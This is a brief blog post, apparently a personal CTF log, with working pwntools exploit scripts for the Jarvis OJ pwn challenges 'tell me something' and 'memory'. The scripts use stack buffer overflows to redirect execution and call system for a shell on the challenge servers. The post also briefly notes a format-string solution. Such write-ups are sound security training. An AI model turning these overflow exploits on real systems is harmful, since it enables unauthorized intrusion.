---
title: jarvis_trip
date: 2018-11-28 13:53:54
tags: updating pwn
---
发现自己不知道的东西太多了
简单的题目就直接贴wp了...有点东西的题目会有转跳链接

从刷题开始...
keep hunger keep foolish
<!--more-->

# tell me something
[附件][1]
```exp
from pwn import *
off=0x88
p=remote("pwn.jarvisoj.com",9876)
#p=process("challenge")
p.readuntil("message:")
payload=off*'\x01'+p64(0x000000000400620)
#gdb.attach(p)
p.send(payload)
p.interactive()
```

# smashes
[传送门][2]

# fm
直接拿着fmtstr_payload(off,{a,b})就可以了
拿ipython做的没有留wp

# memory
简单的溢出
```python
from pwn import *
sh=0x80487E0
system=0x80485BD
p=remote("pwn2.jarvisoj.com",9876)
#p=process("./memory")
context.arch='i386'
#gdb.attach(p)
p.sendline("A"*23+p32(system)+p32(system)+p32(0)+p32(sh))
p.interactive()
```

[1]:https://github.com/n132/Watermalon/tree/master/jarvis/tell%20me%20something
[2]:https://n132.github.io/2018/11/28/jarvis-smashes/